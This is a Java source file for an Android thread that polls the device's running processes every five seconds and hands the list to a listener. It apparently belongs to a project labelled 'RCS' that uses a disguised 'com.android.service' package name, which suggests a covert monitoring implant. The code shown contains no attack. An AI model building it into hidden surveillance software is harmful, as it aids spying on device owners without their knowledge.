/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorProcess.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.listener;

import java.util.ArrayList;

import android.app.ActivityManager.RunningAppProcessInfo;

import com.android.service.RunningProcesses;
import com.android.service.conf.Configuration;

public class BroadcastMonitorProcess extends Thread {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorProcess";

	private boolean stop;
	private int period;
	RunningProcesses runningProcess;

	private ListenerProcess listenerProcess;

	public BroadcastMonitorProcess() {
		stop = false;
		period = 5000; // Poll interval
		runningProcess = new RunningProcesses();
	}

	synchronized public void run() {
		do {
			if (stop) {
				return;
			}

			runningProcess.update();
			listenerProcess.dispatch(runningProcess);

			try {
				wait(period);
			} catch (InterruptedException e) {
				if(Configuration.isDebug()) { e.printStackTrace(); }
			}
		} while (true);
	}

	void register(ListenerProcess listenerProcess) {
		stop = false;
		this.listenerProcess=listenerProcess;
	}

	synchronized void unregister() {
		stop = true;
		notify();
	}
}
